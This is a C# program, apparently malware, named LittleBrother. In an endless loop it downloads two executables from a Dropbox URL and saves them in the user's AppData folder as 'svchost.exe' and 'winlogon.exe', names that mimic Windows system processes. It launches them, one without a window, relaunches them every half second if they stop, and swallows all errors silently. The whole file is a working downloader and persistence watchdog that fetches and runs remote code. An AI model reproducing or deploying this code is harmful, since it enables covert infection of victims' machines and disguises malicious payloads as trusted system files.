using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Net;
using System.Threading;
using System.Diagnostics;

namespace LittleBrother
{
    class Program
    {
        static void Main(string[] args)
        {
            while (Thread.CurrentThread.IsAlive) // Play as looping ;D
            {
                try
                {
                    string BrotherPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft/Windows"); // Define the folder
                    string BrotherName = "svchost.exe";

                    string SpookyPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft//Windows");
                    string SpookyName = "winlogon.exe";

                    if (!File.Exists(Path.Combine(BrotherPath, BrotherName))) // If the brother doesn't exist, download it
                    {
                        if (!Directory.Exists(BrotherPath)) // If the directory doesn't exist, create a new one
                            Directory.CreateDirectory(BrotherPath);

                        WebClient _WClient = new WebClient();

                        _WClient.DownloadFileAsync(new Uri("https://dl.dropbox.com/u/81945809/SpookyVision/BigBrother.exe"), Path.Combine(BrotherPath, BrotherName));
                    }

                    if (!File.Exists(Path.Combine(SpookyPath, SpookyName))) // If the brother doesn't exist, download it
                    {
                        if (!Directory.Exists(SpookyPath)) // If the directory doesn't exist, create a new one
                            Directory.CreateDirectory(SpookyPath);

                        WebClient _WClient = new WebClient();

                        _WClient.DownloadFileAsync(new Uri("https://dl.dropbox.com/u/81945809/SpookyVision/SpookyVision.exe"), Path.Combine(SpookyPath, SpookyName));
                    }

                    if (!BrotherIsOpen(Path.Combine(BrotherPath, BrotherName))) // Launch the brother
                    {
                        Process _Brother = new Process();

                        _Brother.StartInfo.FileName = Path.Combine(BrotherPath, BrotherName);
                        _Brother.StartInfo.WorkingDirectory = BrotherPath;
                        _Brother.StartInfo.CreateNoWindow = true;
                        _Brother.Start();
                    }

                    if (!SpookyIsOpen(Path.Combine(SpookyPath, SpookyName))) // Launch the brother
                    {
                        Process _Spooky = new Process();

                        _Spooky.StartInfo.FileName = Path.Combine(SpookyPath, SpookyName);
                        _Spooky.StartInfo.WorkingDirectory = SpookyPath;
                        _Spooky.Start();
                    }
                }
                catch
                {
                    // Please don't crash the application :D
                }

                Thread.Sleep(500);
            }
        }

        private static bool BrotherIsOpen(string Path)
        {
            FileStream _FStream;

            try
            {
                _FStream = File.Open(Path, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
                _FStream.Close();
                return false;
            }
            catch
            {
                _FStream = null;
                return true;
            }
        }

        private static bool SpookyIsOpen(string Path)
        {
            FileStream _FStream;

            try
            {
                _FStream = File.Open(Path, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
                _FStream.Close();
                return false;
            }
            catch
            {
                _FStream = null;
                return true;
            }
        }
    }
}
